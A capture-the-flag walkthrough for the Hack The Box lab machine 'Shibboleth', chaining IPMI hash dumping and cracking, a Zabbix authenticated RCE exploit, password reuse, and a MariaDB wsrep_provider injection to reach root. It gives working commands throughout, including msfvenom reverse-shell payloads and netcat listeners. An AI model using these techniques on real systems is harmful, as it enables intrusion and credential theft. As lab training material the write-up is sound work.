# [shibboleth](https://app.hackthebox.com/machines/410)

> A Linux server hosting a BMC service and [Zabbix monitoring service](https://www.zabbix.com/). The BMC service is accessible via IPMI 2.0, which can be exploited to disclose the password hash of configured users. The password is in [rockyou.txt](https://www.google.com/search?channel=fs&client=ubuntu&q=rockyou.txt++++) and is thus, easily reversible. This password can be used to access the Zabbix administrative interface, which contains an [authenticated RCE vulnerability](https://www.exploit-db.com/exploits/50816). Reuse of this password grants access to another user account which can read the Zabbix configuration file. This file contains a MySQL/MariaDB credential. The MySQL/MariaDB server is running as `root` and is vulnerable to [CVE-2021-27828](ttps://www.exploit-db.com/exploits/49765), an operating system command injection vulnerability. Exploiting this enables RCE as `root`.

---

## Open Port Enumeration

### TCP

The target's TCP port 80 is open.

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/shibboleth.masscan 10.129.123.64
$ cat enum/shibboleth.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
80,
```

Apache 2.4.41 is running on port 80. It redirects to `http://shibboleth.htb`. Add this hostname to the local DNS resolver.

```bash
$ nmap -sC -sV -p80 10.129.123.64 -oA enum/shibboleth
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 23:11 EDT
Nmap scan report for 10.129.123.64
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
```

### UDP

The target's UDP port 623 (MCP) is open.

```bash
$ sudo nmap -sU 10.129.123.122
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 15:41 EDT
Nmap scan report for shibboleth.htb (10.129.123.122)
Host is up (0.049s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 1004.35 seconds
```

---

## UDP Port 623 Enumeration

Seems to be running IPMI version 2.0.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.123.122   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.123.122->10.129.123.122 (1 hosts)
[+] 10.129.123.122:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

IPMI 2.0 contains a [vulnerability](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval) in which it discloses the password hashes of configured users. Use the Metasploit module `scanner/ipmi/ipmi_dumphashes` to retrieve these hashes, revealing the hash of the user `Administrator`.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                            Required  Description
   ----                  ---------------                            --------  -----------
   CRACK_COMMON          false                                      yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                              no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                 no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/word  yes       File containing common passwords for offline cracking, one per line
                         lists/ipmi_passwords.txt
   RHOSTS                10.129.123.122                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                                                              Using-Metasploit
   RPORT                 623                                        yes       The target port
   SESSION_MAX_ATTEMPTS  5                                          yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                          yes       Delay between session retries in seconds
   THREADS               1                                          yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/word  yes       File containing usernames, one per line
                         lists/ipmi_users.txt

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.123.122:623 - IPMI - Hash found: Administrator:7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

After running the hash through `rockyou.txt`, `Administrator`'s password is `ilovepumkinpie1`.

```bash
$ hashcat -m 7300 '7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4' rockyou.txt
7df68289020200007155c0f10a78865a967592291fa8a399b8eb5346ceef04d229d2b5c846ec0e22a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:debf95ec5baffad0c159155c175911e56bd6c9f4:ilovepumkinpie1
```

---

## TCP Port 80 Enumeration

### Virtual Host Enumeration

The vast majority of virtual hosts return 302s. [Filtering those away](https://gist.github.com/tgihf/4c8f510ba18c392aa9a849549a048a8c) yields 200s with the same response size for `monitor`, `monitoring`, and `Monitor`. Add these to the local DNS resolver.

```bash
$ gobuster vhost -u http://shibboleth.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt > vhosts.txt
$ gobuster-vhost-to-json --file vhosts.txt | jq '.[] | select(.status != 302)'
{
  "hostname": "monitor.shibboleth.htb",
  "status": 200,
  "size": 3689
}
{
  "hostname": "monitoring.shibboleth.htb",
  "status": 200,
  "size": 3689
}
{
  "hostname": "Monitor.shibboleth.htb",
  "status": 200,
  "size": 3689
}
```

---

## `http://shibboleth.htb`

An instance of the [FlexStart Bootstrap Template](https://bootstrapmade.com/flexstart-bootstrap-startup-template/). Seems completely static.

### Content Discovery

The only paths discovered `/assets` and `/forms`.

```bash
$ feroxbuster -u http://shibboleth.htb --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shibboleth.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      317c http://shibboleth.htb/assets => http://shibboleth.htb/assets/
301      GET        9l       28w      316c http://shibboleth.htb/forms => http://shibboleth.htb/forms/
403      GET        9l       28w      279c http://shibboleth.htb/server-status
[####################] - 30s    29999/29999   0s      found:3       errors:7
[####################] - 30s    29999/29999   982/s   http://shibboleth.htb
```

Nothing discovered off `/forms`.

```bash
$ feroxbuster -u http://shibboleth.htb/forms --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shibboleth.htb/forms
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 30s    29999/29999   0s      found:0       errors:10
[####################] - 30s    29999/29999   989/s   http://shibboleth.htb/forms
```

---

## `http://monitor.shibboleth.htb`

The login form for Shibboleth Data Systems' [Zabbix](https://www.zabbix.com/) instance, a business monitoring platform. According to the page's source code, it appears to be Zabbix version 5.0.

### Zabbix 5 Authenticated RCE

The credential `Administrator`:`ilovepumkinpie1` grants access to the Zabbix administrative panel. There is an [authenticated RCE vulnerability](https://www.exploit-db.com/exploits/50816) in Zabbix 5.

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
```

Download and run the exploit.

```bash
$ curl -s https://www.exploit-db.com/raw/50816 > 50816.py
$ python3 50816.py
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>
$ python3 50816.py http://monitor.shibboleth.htb Administrator 'ilovepumkinpie1' 10.10.14.14 80
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[+] the payload has been Uploaded Successfully
[+] you should find it at http://monitor.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33617
[+] set the listener at 80 please...
[?] note : it takes up to +1 min so be patient :)
[+] got a shell ? [y]es/[N]o: y
Nice !
```

Navigate to the URL specified by the exploit's output and receive a reverse shell as `zabbix`.

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.123.122] 47980
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zabbix@shibboleth:/$ id
id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

Use the password `ilovepumkinpie1` to switch to `ipmi-svc`'s account and grab the user flag from `/home/ipmi-svc/user.txt`.

```bash
zabbix@shibboleth:/etc/ayelow$ su ipmi-svc
Password:ilovepumkinpie1
ipmi-svc@shibboleth:/etc/ayelow$ ls -la /home/ipmi-svc/user.txt
-rw-r----- 1 ipmi-svc ipmi-svc 33 Apr  5 14:11 /home/ipmi-svc/user.txt
```

---

## CVE-2021-27828 Privilege Escalation

`ipmi-svc` has read access to the Zabbix server configuration file, `/etc/zabbix/zabbix_server.conf`.

```bash
ipmi-svc@shibboleth:/etc/ayelow$ ls -laR /etc/zabbix/
/etc/zabbix/:
total 100
drwxr-xr-x  4 root     root      4096 Nov  8 11:02 .
drwxr-xr-x 96 root     root      4096 Nov  8 11:02 ..
-r--------  1 zabbix   zabbix      33 Apr 24  2021 peeesskay.psk
drwxr-xr-x  2 www-data root      4096 Apr 27  2021 web
-rw-r--r--  1 root     root     15317 May 25  2021 zabbix_agentd.conf
-rw-r--r--  1 root     root     15574 Oct 18 09:24 zabbix_agentd.conf.dpkg-dist
drwxr-xr-x  2 root     root      4096 Apr 27  2021 zabbix_agentd.d
-rw-r-----  1 root     ipmi-svc 21863 Apr 24  2021 zabbix_server.conf
-rw-r-----  1 root     ipmi-svc 22306 Oct 18 09:24 zabbix_server.conf.dpkg-dist

/etc/zabbix/web:
total 12
drwxr-xr-x 2 www-data root     4096 Apr 27  2021 .
drwxr-xr-x 4 root     root     4096 Nov  8 11:02 ..
-rw------- 1 www-data www-data 1507 Apr 24  2021 zabbix.conf.php

/etc/zabbix/zabbix_agentd.d:
total 8
drwxr-xr-x 2 root root 4096 Apr 27  2021 .
drwxr-xr-x 4 root root 4096 Nov  8 11:02 ..
```

It contains the Zabbix database credential, `zabbix`:`bloooarskybluh`.

```txt
### Option: DBName
#       Database name.
#
# Mandatory: yes
# Default:
# DBName=

DBName=zabbix

### Option: DBSchema
#       Schema name. Used for PostgreSQL.
#
# Mandatory: no
# Default:
# DBSchema=

### Option: DBUser
#       Database user.
#
# Mandatory: no
# Default:
# DBUser=

DBUser=zabbix

### Option: DBPassword
#       Database password.
#       Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh
```

MySQL/MariaDB 10.3.25 is running on `localhost` and the credential `zabbix`:`bloooarskybluh` grants access.

```bash
ipmi-svc@shibboleth:~$ mysql -u zabbix -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 168
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
```

[CVE-2021-27928](https://www.exploit-db.com/exploits/49765) is an operating system command execution vulnerability in MariaDB 10.2 - 10.2.37, 10.3 - 10.3.28, 10.4 - 10.4.18, and 10.5 - 10.5.9. The target's MariaDB version falls in this range. Follow the instructions [here](https://github.com/Al1ex/CVE-2021-27928) to exploit the vulnerability.

Generate a 64-bit reverse shell shared object file payload.

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.40 LPORT=443 EXITFUNC=thread -f elf-so -o tgihf.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: tgihf.so
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Stage the payload to the target and exploit the vulnerability.

```bash
ipmi-svc@shibboleth:~$ mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/home/ipmi-svc/tgihf.so"'
Enter password:
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
```

Receive the reverse shell as `root` and read the system flag at `/root/root.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.229.202] 40286
id
uid=0(root) gid=0(root) groups=0(root)
ls -la /root/root.txt
-r-------- 1 root root 33 Apr  5 14:11 /root/root.txt
```
